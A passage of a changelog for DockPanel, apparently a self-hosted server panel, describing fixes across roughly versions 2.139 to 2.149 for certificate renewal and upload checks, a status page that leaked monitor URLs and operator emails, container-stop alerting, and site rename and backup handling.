+  Clearing the Domain field entirely is still refused; the refusal's wording has
+  been corrected, because the reason it used to give — that nothing in the Git
+  Deploy path could take a vhost down — is no longer true.
+
+## [2.149.0]
+
+### Fixed — the public status page published monitor URLs, and the guide said it did not
+
+`docs/guides/status-page.md` has stated, in the list of what a visitor sees, that
+monitor **URLs are not published**. That was true of the monitor list and false
+of incident causes.
+
+When an HTTP check failed, DockPanel stored the HTTP client's own error message.
+That message ends with `for url (…)`, so the monitor's full address — scheme,
+host, path and **query string** — was written into the incident's cause, into
+the incident's description, and into the *"Auto-detected: …"* entry on its
+timeline. Two of those three are served by `/api/status-page/public`, which
+answers with no login at all. A monitor pointed at a health endpoint that
+authenticates by query parameter published that parameter to anyone who loaded
+`/status`.
+
+The check's failure reason is now composed rather than copied: the URL is
+dropped, and the useful half — the operating system's or the TLS library's own
+sentence, several layers down inside the error — is kept, so a failure still
+reads *"error sending request: client error (Connect): Connection refused (os
+error 111)"* rather than becoming four identical words. A migration strips the
+URL out of rows already stored, in all four columns that hold one.
+
+**If a monitor URL contained a token and your status page was on, rotate that
+token.** Neither the fix nor the migration can un-publish what was already
+fetched, or reach a backup taken before the upgrade. Note that the status page
+may have been reachable without you enabling it — see the v2.70.0 upgrade note
+in the guide.
+
+One residual is deliberate: when a check fails on a certificate name mismatch,
+the error still names the domains the *certificate* is valid for. That is a
+property of the certificate the monitored host presented rather than of the URL
+you configured, and removing it would mean pattern-matching the TLS library's
+wording, which is the kind of coupling this change exists to undo.
+
+### Fixed — the public status page published the operator's email address
+
+The same unauthenticated response carried each incident update's `author_email`,
+because the timeline rows were serialized whole. Nothing rendered it — the
+public page has never declared the field — so it was visible only to someone
+reading the JSON. The switch's own description in Settings lists everything else
+this publishes and has never mentioned an address.
+
+The timeline is now projected field by field: status, message and timestamp. The
+field is untouched everywhere it belongs, including the Incidents screen and the
+guide's account of update attribution.
+
+## [2.148.1]
+
+### Fixed — a refusal message that overstated what it was protecting
+
+v2.148.0's new certificate-upload check refuses a private key pasted into the
+certificate field, and told the operator that storing it there *"would leave it
+readable by every account on this server."* Driving the case on a fresh install
+showed that is not true: the key does land in `fullchain.pem` at 0644 while the
+key file beside it is deliberately 0600, but `/etc/dockpanel` and
+`/etc/dockpanel/ssl` are both 0700, so no other local account can reach it. The
+protection comes from the directory rather than from the write.
+
+The refusal stands — the certificate field should hold a certificate, and that
+paste also leaves the site with no readable expiry, which is the half that
+actually bites. Only the sentence changed, to say what is true. The same
+overstatement is corrected in v2.148.0's entry above and in the monitoring guide.
+
+## [2.148.0]
+
+### Fixed — an uploaded certificate is now checked against the site it secures
+
+Uploading your own SSL certificate accepted almost anything. The only checks were
+that the domain looked like a domain and that the text contained the words
+`BEGIN CERTIFICATE`; the certificate itself was never opened.
+
+So pasting the wrong `fullchain.pem` — the everyday slip on a server holding a
+few dozen of them — installed cleanly and reported success. nginx does not
+compare a certificate against the site it is serving, so it started without
+complaint, the panel wrote *SSL enabled* and drew a padlock, and the expiry
+countdown and the renewal alerts all treated the site as healthy. The only thing
+that disagreed was the visitor's browser, with `ERR_CERT_COMMON_NAME_INVALID`.
+Nothing in DockPanel would ever have told you.
+
+The upload is now refused, **before anything is written to disk**, if the
+certificate does not name the site: its subjectAltName entries are checked, or
+its Common Name when it carries no SAN, exactly as a browser does. The refusal
+says which names the certificate actually covers, so a mixed-up paste identifies
+itself. A wildcard counts for one level only — `*.example.com` covers
+`app.example.com` and not `app.staging.example.com`.
+
+Two smaller faults on the same door closed with it, both from a key-then-certificate
+paste that the old substring check accepted. The key landed in `fullchain.pem` at
+0644 while the key file beside it is deliberately 0600 — not reachable by other
+local accounts, because the enclosing directories are 0700, but protected by the
+directory rather than by the write. And because the expiry reader decodes the
+first block in the file whatever it is, that paste left the site with no recorded
+expiry — the row the countdown, the expiry alerts and the auto-healer all filter
+out.
+
+This is an agent-side change, so it reaches a server when that server's agent
+updates.
+
+### Fixed — a Compose deploy that did not happen was reported as running
+
+Adding a `docker-compose.yml` to a Git Deploy switches it onto a different code
+path, and two of that path's failures were silent.
+
+**Services that build from source were dropped without a word.** The Compose
+support runs registry images; it does not build them. Any service that named no
+image was skipped, so a repository with a Dockerfile — exactly the repository
+whose compose file builds from source — deployed without its own application
+while the panel recorded the new commit as running. Such a file is now refused,
+and the refusal names the services it would have skipped.
+
+**A deploy in which nothing came up was recorded as a success.** The agent
+reports each service's outcome inside an otherwise successful response, and
+nothing read those outcomes. This was not a rare case: the Compose engine removes
+nothing, so the *second* Compose deploy of the same deployment collides with its
+own container names and every service fails — and that was written down as a
+successful deploy of the new commit. Both call sites now read the per-service
+results, and a deploy where no service stayed running is recorded as failed with
+the agent's own reason.
+
+The rest of the warning in the Git Deploy guide still stands: a Compose deploy
+does not take over the Domain field, and does not remove the container already
+running, so your domain goes on serving the previous build.
+
+### Added — the accepted-but-unbuilt designs are now recorded in the code
+
+Two designs had been accepted in writing with reporters and existed nowhere a
+contributor would find them. Both are now written beside the code that would
+change: the constraint that a "supply your own certificate" mode for stacks needs
+a stored mode rather than another optional field, together with the three points
+settled on that design; and the five constraints on adding persistent volumes to
+Git Deploys, the first of which turns the obvious patch into data loss.
+
+## [2.147.0]
+
+### Fixed — removing a container let it silence the next container of the same name
+
+When you stop a container from the panel, DockPanel records that the stop was
+deliberate so it does not then alarm about a container being down. That record is
+kept against the container's **name**.
+
+If you went on to *remove* that container, the record stayed behind — and nothing
+was able to clear it. The only automatic clear happens when the panel sees the
+container running again, and a container that has been removed is never seen
+again at all.
+
+That matters because removing an app and deploying it again under the same name
+is the ordinary way to rebuild one while keeping its data. The replacement
+inherited the old record, so if it failed to start:
+
+- no **container down** alert was raised for it, ever;
+- automatic repair skipped it instead of trying to restart it;
+- and the **Apps** page filed it under *stopped on purpose*, attributing it to
+  whoever had stopped the container that no longer existed.
+
+So the one container you were most likely to be watching — the one you had just
+stopped, removed and redeployed because it was misbehaving — was the one the
+panel had quietly stopped reporting on. There was no expiry on this and no
+message anywhere; the record simply stayed until something of that name was
+started successfully, which is precisely what was failing to happen.
+
+**Two things changed.** Removing a container now forgets its record at the moment
+of removal — for a single app, for a whole stack, and for the containers replaced
+during a stack edit. And the alert engine now also clears records for containers
+the machine no longer reports at all, which covers a container removed outside
+the panel and any future way of removing one.
+
+That sweep deliberately does nothing when a machine reports no containers at all,
+because "there is nothing here" and "I could not read this machine" arrive
+looking the same, and acting on the second would clear every deliberate stop on
+that machine at once.
+
+## [2.146.1]
+
+### Fixed — the certificate-path repair in 2.146.0 missed the commonest case
+
+2.146.0 made a renewal record the path of the certificate it had just installed,
+so the site's nginx config could no longer be re-rendered from a path pointing
+somewhere else. That repair was attached to the wrong condition: it ran only when
+the renewal also had something new to record about *how* the certificate had been
+issued.
+
+Those are two different questions. "Did this renewal learn something new about
+the certificate?" is true occasionally. "Did this renewal install a certificate
+under the site's own name?" is true every time. Gated on the first, the repair
+skipped the largest group of affected sites — the ones whose issue method was
+already known — and for those the stored path could never be corrected, so every
+future renewal would install a certificate and go on ignoring it.
+
+2.145.0 is what created that group: it recorded the issue method for sites that
+had none, without correcting their path. The repair now runs for every renewal
+that installs under the site's own name, which is what it should always have
+done. A wildcard is still left alone: its path names the zone, which is correct.
+
+Found by driving a real server, not by reading the code — the panel's own
+automatic first-issue step overwrote the test's setup and put the site straight
+into the group the repair was missing.
+
+## [2.146.0]
+
+### Fixed — deleting one certificate could take every site on the server down
+
+Deleting a certificate from the **Certificates** page removed it from disk and
+cleared the site's SSL columns — and left the site's nginx config still naming
+the file that had just been deleted. `nginx -t` validates the **whole server**,
+so from that moment every later configuration change on that machine failed its
+check and was rolled back, and the next nginx restart left every site on the box
+dark. Not only the site whose certificate was deleted.
+
+The four other places that write or remove a certificate have always re-rendered
+the site's config afterwards. This one never did, and the code that deletes the
+files describes the outcome exactly, in two other places, for the two doors that
+were already guarded.
+
+Deleting a certificate now re-renders the site's configuration as plain HTTP, so
+the site keeps serving on port 80 instead of taking the server with it.
+
+⚠ One residual, stated rather than left to be discovered: a **WordPress** site
+whose canonical URL was promoted to `https://` when the certificate was issued is
+not demoted when it is deleted, so it will redirect to a port that is no longer
+listening until the URL is changed back. That is one site, two clicks from
+repair, and it is unchanged from previous releases.
+
+### Fixed — a renewed certificate could be installed and then ignored
+
+A renewal writes the new certificate under the site's own name and the panel
+re-renders the site's nginx config immediately afterwards — from a stored path
+that **no renewal path has ever updated**. For a site whose stored path pointed
+somewhere else, the panel therefore installed a fresh certificate and then
+pointed nginx straight back at the old one, while recording the new
+certificate's 90-day expiry against the site.
+
+The renewal window never reopened, so nothing tried again. The site went dark at
+the *old* certificate's real expiry, behind a panel showing two months remaining
+and a notice saying the certificate had been renewed successfully.
+
+v2.145.0 fixed this for certificates whose provenance it could recover. This
+release fixes it for the rest, by making the recorded path follow the
+certificate that was actually installed — at all four renewal doors, from one
+place.
+
+### Fixed — issuing a wildcard could report a failure that had not happened
+
+v2.145.0 derived a single timeout for a DNS-01 order from the agent's own
+arithmetic — two DNS propagation waits plus two polling budgets — and gave it to
+the three paths that *renew* a certificate. The path that **issues** one kept its
+old, shorter limit, which is below the wait it was measured against. So issuing a
+wildcard could time out and report a failure while the agent went on to issue the
+certificate successfully. All four now spend the same budget, and a regression
+test asks the question the previous one could not: the old test counted the
+callers that used the shared budget, which cannot see a caller that does not.
+
+### Changed — two explanations that had stopped being true
+
+The renewal logic and its regression test both explained a deliberate design
+choice with a reason that the previous release had itself repealed. The choice is
+still correct and is unchanged; the reasons now say why. A guard defended by a
+dead reason is one refactor away from being deleted as obsolete.
+
+⚠ The same superseded explanation also appears in a database migration, which
+cannot be corrected: applied migrations are checksummed, so editing the file
+would break the upgrade on every installed system. It is left as shipped and
+recorded here instead.
+
+## [2.145.0]
+
+### Fixed — renewing a DNS-01 certificate destroyed it
+
+`sites` recorded nothing about which ACME challenge issued a certificate, so
+every renewal door — the Renew button, the Diagnostics **Fix** button, the
+auto-healer, and the weekly security scan — aimed an **HTTP-01, single-name**
+order at the site's own domain. For a certificate issued over DNS-01 that is not
+a renewal at all: it orders a different certificate, for a different set of
+names, and for a wildcard it writes that over the file every site in the zone is
+serving. The panel then reported a successful renewal.
+
+It failed in two opposite directions, and both were silent.
+
+**When the site is the Cloudflare zone apex**, the certificate directory is
+named after the site, so the guard that protects certificates DockPanel did not
+issue finds the wildcard, sees a Let's Encrypt issuer, and returns "not foreign"
+— permission to proceed. A single-name certificate was written over the shared
+`fullchain.pem` in place, and every sibling vhost pointing at that directory
+began serving a certificate that does not cover it. This is reachable on a stock
+install: the auto-fix pass runs on every security scan and needs no opt-in.
+
+**When the site is a subdomain under a zone wildcard**, there is no certificate
+at the site's own path, so that same guard exits before it ever reads an issuer.
+The renewal wrote an orphan certificate nothing served, the panel re-rendered the
+vhost from the stored path and pointed nginx *back* at the un-renewed wildcard,
+and stamped the **new** certificate's 90-day expiry onto the row. The renewal
+window never reopened, and the site went dark at the wildcard's real expiry
+behind a panel showing two months remaining and a "renewed successfully" notice.
+
+The v2.141.0 entry below already disclosed this, including the remedy: *"nothing
+records which challenge issued a certificate."* This release records it.
+
+- **`sites` now carries the provenance** — the challenge, the name actually
+  ordered (for a wildcard that is the **zone**, not the site), whether it is a
+  wildcard, and the Cloudflare zone row that issued it. Renewal uses that zone
+  row rather than re-deriving one from a name, so the credential that renews is
+  provably the credential that issued.
+- **A DNS-01 certificate is renewed over DNS-01**, against the name it was
+  issued for, through the agent route that has existed since v2.6.7. Nothing on
+  your servers needs updating: the fix is entirely in the panel.
+- **Renewing over HTTP-01 now requires positive evidence that HTTP-01 issued the
+  certificate.** A row from before this release behaves exactly as it does today
+  once more, records what it learned, and is correct from then on. The weaker
+  rule — "renew over HTTP-01 unless something looks like a wildcard" — never
+  converges, because a non-wildcard DNS-01 certificate is indistinguishable from
+  an HTTP-01 one in every field the panel can read, and that is precisely the
+  certificate whose owner chose DNS-01 *because port 80 cannot be reached*.
+- **A certificate that cannot be re-ordered over DNS-01 is refused and reported,
+  not silently downgraded** — and refusing is a rung, not the end of the ladder.
+  Inside the last seven days it is downgraded **on purpose**, recorded, and
+  announced at critical severity naming exactly which names stopped being
+  covered. That is never a worse outcome than before; it removes the silence,
+  which was the actual defect.
+- **The renewal timeout was shorter than the work at every door.** Two used a
+  60-second cap and the Renew button used 120, while a wildcard DNS-01 order
+  budgets about 260 seconds inside the agent alone — so a DNS-01 renewal timed
+  out while the agent went on to succeed, and the panel recorded a failure, left
+  the expiry stale and wrote a cooldown. All three now share one budget derived
+  from the agent's own arithmetic.
+
+### Fixed — renaming a site left its certificate path pointing at a directory that had moved
+
+The rename wrote the new domain and nothing else, while the agent renamed the
+certificate directory underneath it. The stored path kept naming the old
+directory for ever, and it is sent verbatim to nginx on the next full vhost
+rebuild — so an unrelated edit weeks later could re-point a site at a directory
+that no longer exists. A wildcard's path, which names the zone rather than the
+site, is deliberately left alone.
+
+### Fixed — a certificate issued automatically at site creation recorded no ACME profile
+
+Both deliberate issuance doors stored the profile they used; the one that fires
+on its own three seconds after a site is created never did, so the renewal
+margin and cooldown helpers read a NULL and applied the wrong schedule.
+
+### Fixed — the system log could not show what it was being told
+
+A downgraded certificate records itself in the system log, and the log's own
+source filter did not offer that source, so the row existed and nothing could
+filter for it.
+
+## [2.144.0]
+
+### Fixed — stopping a container published a critical incident on your public status page
+
+Pressing **Stop** on an app, stopping a compose stack, or letting the auto-sleep
+policy park an idle container raised `container_down` at severity `critical`.
+That is the exact string the alert engine gates incident creation on, so the
+panel opened a `managed_incidents` row with `visible_on_status_page` set to TRUE
+— a critical incident, published to your customers, for something you had just
+asked the panel to do. `container_down` is also absent from `is_alert_enabled`'s
+match and falls through to `_ => return true`, so no alert rule could switch it
+off; and the escalation sweep has no severity predicate, so it re-paged every
+thirty minutes for seven days until a human resolved the incident by hand.
+
+The panel had already decided this should not happen, in writing, twice.
+`alert_runbook_defaults.rs` lists `container_down` under **Info**, and the
+runbook attached to every one of those notifications says *"a planned `docker
+stop` is normal operational use, so we don't page on it"* and *"Don't page on
+this alone."* The engine contradicted its own runbook inside the same email.
+
+Two changes:
+
+- **`container_down` is now raised at the severity the product declares** —
+  `info`. It no longer opens an incident on the public status page. Customer-facing
+  outages still page through `service_down` and uptime monitors, which is what
+  the runbook says should carry them.
+- **A stop the panel carried out is now recorded**, so the alert itself stays
+  quiet for it. The Stop button, Sleep, a stack stop and auto-sleep all write to a
+  new `container_expected_stops` table; the alert engine reads it before firing
+  and deletes the row the moment it observes the container in any state that is
+  not `exited`/`dead`. An alert raised *before* the stop is resolved at the same
+  time, and any incident it opened is closed.
+
+The Apps page no longer calls these containers crashed. They are listed
+separately as *"stopped on purpose — not alerting"*, with the reason and who did
+it, and `stop`/`start`/`restart` now write an Activity entry — until now none of
+the three touched the database at all, so nothing recorded who stopped an app.
+
+The auto-healer no longer restarts a container the panel deliberately stopped.
+Its restart leg and the auto-sleep leg share one switch and one tick, restart
+first, and it had no knowledge of sleep state — so it undid the operator's Stop
+within two minutes. That fight was previously visible only through the spurious
+alert this release removes.
+
+### Notes
+
+`is_sleeping` is deliberately untouched. Nothing clears it but `wake_container`,
+and that stuckness is currently the only thing bounding a domainless container —
+whose idle clock nothing refreshes — to one sleep instead of an unbounded
+stop/start loop. The new table is read by the alert engine and the auto-healer
+and by nothing else, which is what makes clearing it from observation safe.
+
+Known bound, stated rather than hidden: a container that is started outside the
+panel and dies again within the same two-minute sweep, having never been observed
+in a non-stopped state, keeps its expectation and stays quiet until it is next
+seen running. Uptime monitors on a stopped app still file their own incident;
+that path is unchanged.
+
+## [2.143.0]
+
+### Fixed — a first install could abort telling the operator their password was wrong, and offer to destroy their data
+
+The installer waited for PostgreSQL with `pg_isready` and no host. That answers
+over the container's own unix socket — and the official Postgres image runs a
+**socket-only temporary server** for the whole of `initdb`, before it starts the
+real one. So the wait cleared while nothing was listening on TCP yet.
+
+The password check directly below it cannot use that socket. The image's
+`pg_hba` trusts local connections, so a socket probe accepts *any* password,
+including the wrong one the check exists to detect; it has to go over the
+container's bridge address to land on the rule that demands a password. Reaching
+a server that has not started listening, it got a refused connection — and a
+refused connection is indistinguishable from a rejected password. The installer
+took that as a mismatch and did one of two things to a database that was
+perfectly healthy: reconciled a password that never needed reconciling, or, when
+the repair landed in the same window, failed and aborted the whole install with
+*"The panel cannot start"* and an instruction to delete the data volume.
+
+The window is the gap between those two servers. Measured here it was about a
+second on an idle machine and over twenty seconds on a loaded one, against a
+two-second poll — so it is a lottery a busy or slow box loses far more often
+than a fast one, and it is the very first thing a new user meets.
+
+The wait now polls the same transport the check uses, which closes the window by
+construction: the temporary server is started with an empty `listen_addresses`
+and *cannot* answer over TCP. A container with no bridge address — host
+networking — still installs; the loop falls through to a socket check after its
+budget, which is also the only case where the password check itself cannot run.
+The budget went from 30 to 60 seconds while we were here, because a slow disk
+legitimately needs longer than 30 to finish `initdb`.
+
+**The failure message was fixed too, and it was the worse half.** It told the
+operator to recover by hand using the password in `api.env` — a file this
+installer does not write until several steps *later*. On a first install that
+aborts here, it does not exist. So the only instruction a new user could actually
+follow was the last one: destroy the container and the volume. It now leads with
+re-running the installer, which is safe and resolves this on its own, and only
+mentions the by-hand recovery when `api.env` is actually there.
+
+### Fixed — the only unattended certificate renewal quietly downgraded the certificate profile
+
+Auto-healing is off on a fresh install, which makes the weekly security scan the
+only renewal that runs unattended — what the product does by default. Both
+renewal paths a human can trigger send the site's chosen certificate profile with
+the order. This one never asked the database for it.
+
+Omitting it does not fail. The CA simply issues its **default** profile instead,
+so a site an operator had deliberately moved to `shortlived` or `tlsserver` came
+back on the default one, permanently, with nothing reporting the change — while
+the database still named the retired choice, and the cooldown and renewal-margin
+helpers went on reading that stale column. A short-lived certificate's margin was
+being applied to a ninety-day one.
+
+## [2.142.0]
+
+### Fixed — renaming a site left every one of its backups behind
+
+Renaming a site's domain migrated the webroot, the vhost, the parked vhost, the
+certificate directory, the nginx logs, the PHP-FPM pools, the fail2ban jail and
+the redirect configs. Ten numbered steps, and none of them touched
+`/var/backups`.
+
+That is worse than a disk leak, because the `backups` table stores a filename and
+**no path**: every reader rebuilds the directory from the site's current domain.
+So the moment a rename completed, every archive the site had became
+**unrestorable and undownloadable** — while the panel went on listing all of them
+as if nothing had happened. Restore answered `502 Operation failed` with an
+incident number. Download did the same. Then the nightly retention sweep resolved
+the new name, got "no such file", treated that as *already gone*, deleted the
+rows, and counted them in the number of backups it reported pruning. Records
+destroyed, files stranded under a name nothing would look up again, success
+logged.
+
+A rename now carries all three domain-keyed trees — the archive directory, the
+restic repository and the WordPress update snapshots — and the archives inside
+are re-prefixed to the new name, because off-site retention is handed the site's
+live domain and uses it to decide which remote objects it may delete. Left alone,
+remote pruning silently stopped enforcing for a renamed site, and would have
+started matching the *previous* occupant's objects if the old name were reused.
+
+Two things a rename will now refuse rather than do quietly:
+
+- **A destination that already holds backups.** This is not a hypothetical
+  collision. Deleting a site writes a final pre-delete archive and records no row
+  for it, and the cascade then removes the rows that would have named it — so
+  every completed site delete leaves an archive directory that outlives every
+  record of itself. Renaming another site onto that domain would have merged two
+  tenants' archives into one listing, one click from restoring the wrong site
+  over a live webroot. The rename now stops before anything moves and names the
+  directory to clear.
+- **A site with backups on an agent too old to carry them.** Such an agent
+  answers success and leaks anyway, and there is nothing in its reply to notice.
+  A site with no backups still renames on any agent version.
+
+If the move fails part way, the trees already carried are put back and the site
+returns to its old domain. ⚠ As before this release, the certificate directory,
+the logs, the pools, the jail and the redirect configs are *not* reverted by a
+rollback — that asymmetry is older than this change and is not addressed here.
+
+⚠ Renaming does not make a *restic* snapshot taken before the rename restorable
+under the new name: those snapshots record absolute paths under the old webroot.
+The repository is no longer lost, which it was; that is a different fix.
+
+⚠ Archives already uploaded off-site keep their old-domain object names. Local
+files and rows are re-prefixed; re-keying remote objects is not part of this
+release.
+
+### Fixed — a backup whose upload failed could never be cleaned up
+
+When a scheduled backup was created but its off-site upload exhausted all three
+retries, the panel recorded **no row at all** — deliberately, with a comment
+saying the local file remained "for manual recovery".
+
+Retention only ever enumerates rows. A full-site tarball that no row names is
+therefore invisible to it for ever. One nightly schedule against a destination
+that has gone away produced one unreapable archive per night, accumulating on the
+very disk the backups exist to insure — and the sibling that runs policy backups
+had already rejected this design in a comment naming the divergence, and fixed
+only its own side.
+
+The archive is now recorded local-only, with the schedule's destination attached
+so a failed upload can be told apart from a schedule that never had one. The run
+still fails, still writes `last_status = 'failed'`, and still raises the critical
+backup alert.
+
+Because that row now exists, three places that reported "no recent backup" purely
+*because* no row existed were taught to ignore an archive that never left the
+machine — the dashboard's backup-freshness tile, the Backup Health stale list and
+the 48-hour stale-backup notification. Without that, the one site whose
+destination is down would have started reading as freshly backed up.
+
+### Fixed — deleting a site left its database dumps on disk
+
+v2.140.0 added a purge for a database's dump directory and wired it to exactly
+one caller: deleting a database from the Databases page. Deleting the **site**
+removed the containers only — it did not even read the database names, so it
+never held the value the purge needs.
+
+Site deletion is the likeliest way a database name is freed, and a dump directory
+is named for the database alone. Site delete now purges each of its databases'
+dumps, after the cascade rather than before — before it, every name is still
+claimed by the row being deleted, so the "is anything else using this name?"
+check answers yes about the row itself, nothing is purged, and the log line reads
+exactly like a correct decision. A name still in use by another site on the same
+host is still kept, and a directory holding anything the panel did not write is
+still left alone.
+
+### Fixed — one database name could not have its dumps deleted at all
+
+`dump` is a legal database name, and it collides with a static segment in the
+agent's own routing table. The route was registered so that the name would not
+answer 405 — but it was pointed at a handler that asks for a path parameter the
+static path cannot supply, so it answered `500` instead. For that one name only.
+
+### Testing
+
+A new pin suite covers the rename carry, both refusals, the rollback, the
+recorded-but-not-uploaded row, the three staleness readers and the dump purge —
+43 assertions, every one of them run against a planted defect and watched to
+print its own failure. Two existing arms that could never have failed were
+repaired in the process: one froze the exact expression this release had to
+change, and one was satisfied by a sibling guard, so the guard it named could be
+deleted outright while it stayed green.
+
+## [2.141.0]
+
+### Fixed — the wildcard certificate door still answered "Operation failed"
+
+v2.140.0 made a declined certificate order explain itself at both HTTP-01 doors,
+and said in this file that the DNS-01 door — the only way a wildcard certificate
+is issued — would get its own message separately. This is that message.
+
+The door matters more than its share of traffic suggests, because of *who* reaches
+it: you choose DNS-01 precisely when HTTP-01 cannot work for you. Until now it
+spent up to three minutes and then said `Operation failed. Reference: <uuid>`,
+including for the two failures you could have fixed in a minute.
+
+It could not simply reuse the sentence the other two doors share. That one offers
+"check that the domain resolves here and that port 80 is reachable" — advice this
+door's own button contradicts, since it exists for people whose port 80 is not
+reachable. Repeating it would have sent you to open a port that had nothing to do
+with the failure.
+
+There are also three parties here rather than two, and they are now told apart:
+
+- **Let's Encrypt declined.** Answered with the CA's own reason, plus a
+  conditional note about the `_acme-challenge` TXT record.
+- **Cloudflare refused.** Almost always an API token without the `DNS:Edit`
+  permission — yours to fix, and now named as such. Attributing this to Let's
+  Encrypt would have blamed the wrong party.
+- **Something on the server broke.** Unchanged: a reference number, which is what
+  an unwritable directory is.
+
+As before the classification is positive — the agent marks what the CA and the DNS
+provider actually said, and anything unmarked stays a server fault and keeps its
+reference number, including any failure added later. On a wildcard the message
+names the certificate that was actually ordered (`*.your-zone`), not the site you
+happened to be looking at, because the order is placed against the zone.
+
+**Still not fixed, and worth stating plainly:** *renewal* of a DNS-01 certificate
+does not run over DNS-01 at all — every renewal path uses HTTP-01, which cannot work
+for the sites that needed DNS-01 in the first place. Nothing records which
+challenge issued a certificate, so that needs a schema change and is not in this
+release. Certificate *issuance* now explains itself at all three doors; renewal
+still does not.
+
+This half lives in the agent, which is installed together with the panel by the
+normal update. If you run additional servers, their agents need to update too
+before their DNS-01 failures start explaining themselves.
+
+### Fixed — a database name the panel accepted and the machine then refused
+
+The create form and the panel both accepted a name beginning with an underscore
+(`_mydata`). The agent, which actually creates the database, requires the first
+character to be a letter or a number — so the form validated your input, the panel
+forwarded it, and you got a raw refusal back from a machine.
+
+No database survived in that state — the record is written first to claim its port,
+and the agent's refusal rolls it straight back — so this was a confusing failure
+rather than a corrupting one. The form now states the rule and refuses the name
+itself, before anything is written at all. The 63-character limit is unchanged and
+is deliberate: a PostgreSQL identifier is 63 bytes.
+
+### Fixed — three dashboard checkboxes that controlled nothing
+
+*Customize* on the dashboard offered switches for **SSL Countdown**, **Disk I/O**
+and **Health Indicator**. None of the three was read by anything: ticking or
+unticking them changed nothing at all.
+
+Worse, the SSL certificate countdown was actually governed by the **Active Issues**
+switch, so turning off Active Issues silently took the certificate expiry panel
+with it — one control hiding a panel it did not name, while the control that did
+name it sat inert.
+
+All three now do what they say, and the certificate countdown is independent of
+Active Issues.
+
+## [2.140.0]
+
+### Fixed — an SSL certificate that could not be issued said only "Operation failed"
+
+The likeliest way a certificate request fails is the simplest: the domain does not
+point at this server yet, or port 80 is not reachable, or a wildcard's apex lives
+somewhere else. Let's Encrypt declines, the agent says exactly why — and the panel
+replaced that sentence with `Operation failed. Reference: <uuid>` after up to two
+minutes of spinner, because it hides every internal agent error behind a reference
+number.
+
+That rule is right, and the reason it was right is why this took care to fix: the
+same request answers the same way when the agent itself breaks — a full disk while
+writing the certificate, say — and an operator can do nothing useful with *that*.
+
+So the agent now marks the failures the certificate authority actually produced,
+and only those are answered with their reason. Anything unmarked, including any
+failure added in future, keeps its reference number. The message names what
+happened without asserting why, and never tells you to try again — on a
+rate-limited order that is the one instruction that makes it worse.
+
+Both HTTP-01 doors were fixed, not just the one the symptom was reported against:
+**provisioning** a first certificate fails this way more often than **renewing**
+one, since a domain that was never pointed here has never had a certificate to
+renew. Wildcard certificates, which are issued over DNS-01, still answer with a
+reference number — their useful advice is about Cloudflare token scope and TXT
+propagation rather than port 80, so they need their own message and will get it
+separately.
+
+### Fixed — deleting a database left its dumps on disk for ever
+
+Removing a database took its container and its records and left every dump behind:
+invisible to the backup list, ignored by every retention policy (those only remove
+files still named by a surviving record), and never cleaned up by anything. On a
+server that reuses database names they accumulated for the life of the machine.
+
+Deletion now removes the dump directory too — but only when no other database on
+that server still answers to the same name. Database names are unique per site
+rather than per server, so two sites can legitimately share one dump directory,
+and taking it on the first deletion would have destroyed the other site's backups.
+Where that is in any doubt, the files are kept.
+
+The purge removes the dump files it recognises and then the directory, only if
+that emptied it. A directory holding anything else — a dump you placed there
+yourself to import — keeps its contents.
+
+### Fixed — long operations on remote servers ignored their own concurrency limit
+
+DockPanel keeps a small pool for slow work (builds, imports, restores) so it
+cannot crowd out ordinary requests. On any server other than the panel's own, three
+kinds of long operation took the *ordinary* pool instead, so the limit applied to
+one machine in the fleet and no others.
+
+Related: the wait for a free slot was not counted against the operation's own time
+budget. A restore allows itself less time than the server allows the request, so
+that the panel is the one to stop waiting and can explain why — and time spent
+queueing was pushing past the server's limit instead, producing an empty gateway
+timeout. Queueing is now part of the budget, and an operation that never got a
+slot says so rather than reporting that it ran and overran.
+
+### Fixed — an uploaded certificate inherited the previous one's renewal settings
+
+Installing your own certificate left behind the ACME profile describing the
+certificate DockPanel used to issue for that site, and both renewal paths went on
+applying it. It is now cleared, so any future renewal decides for itself.
+
+## [2.139.1]
+
+### Fixed — a certificate DockPanel deliberately left alone was reported as a failure
+
+2.139.0 stopped the automatic renewal from replacing certificates it did not
+issue, and told you about the skip by reusing the alert that already existed for
+renewals that go wrong. That alert says **"SSL renewal failed"**, explains that
+DockPanel *could not* renew the certificate, and pages at **critical** severity.
+
+All three are untrue when the panel declined on purpose. Nothing failed, nothing
+was prevented, and the situation is not an emergency — it is a certificate you
+manage, which you will renew where you bought it. Paging you about a failure that
+did not happen is the same defect this release exists to remove, one layer
+further out, and it is exactly how an operator learns to ignore the alert that
+means a site really is about to go dark.
+
+That case now has its own message — *"SSL certificate for example.com needs
+renewing by you"*, at warning severity, naming the issuer and saying where to
+renew it. Genuine renewal failures are unchanged.
+
+## [2.139.0]
+
+### Fixed — a renewal is a replacement, and nothing was checking whose certificate it was
+
+If you uploaded your own certificate — a commercial wildcard, a Cloudflare Origin
+CA certificate, anything from a corporate PKI — DockPanel was quietly destroying
+it, roughly a month before it expired, on a weekly schedule, on a default
+install.
+
+The weekly security scan asks the agent what it found. The agent walks
+`/etc/dockpanel/ssl` and runs `openssl x509 -checkend`, which reads a date and
+nothing else: not the issuer, not the database. Anything expiring within 30 days
+came back as "SSL certificate expiring", and the panel's auto-fix answered by
+placing a fresh Let's Encrypt order and writing it to the same `fullchain.pem`
+your certificate occupied. The site kept working, so nothing looked wrong — it
+had simply stopped presenting the certificate you paid for. Where the domain
+could not answer an HTTP-01 challenge from that box, the order failed instead and
+you were left with neither.
+
+The panel's ACME client can only ever produce a Let's Encrypt certificate, so an
+issuer that is not Let's Encrypt is proof DockPanel did not issue it. Every path
+that can overwrite a certificate now asks that question first — the weekly
+scanner, the auto-healer, and the two buttons — and a certificate that is not
+ours is left alone, with the reason recorded as an alert rather than a log line.
+When the issuer cannot be read at all the renewal still goes ahead: refusing on
+doubt would let a real certificate lapse, which is the failure the loop exists to
+prevent.
+
+### Fixed — the automatic renewal could renew the wrong machine's site
+
+On a fleet, `sites.domain` is unique per server, not globally — the same domain
+may legitimately exist on two members. The scanner's auto-fix resolved the site
+by domain alone, so it could pick up a different host's row: renew using that
+host's runtime, document root and PHP version, write the new expiry onto that
+host's record, and push that host's full nginx configuration through this host's
+agent. Unattended, on the scan loop's own schedule. This is the only automatic
+renewal on a default install, since auto-healing ships off.
+
+The same shape is fixed in one-click provisioning, where a newly created database
+— credentials included — was attached to whichever site row matched the domain
+first, rather than to the site that had just been created.
+
+### Fixed — the SSL "Fix" button could only fail
+
+Diagnostics offered a **Fix** button on every certificate inside 30 days. The
+agent has no arm for that fix and never could: renewing needs the site's runtime,
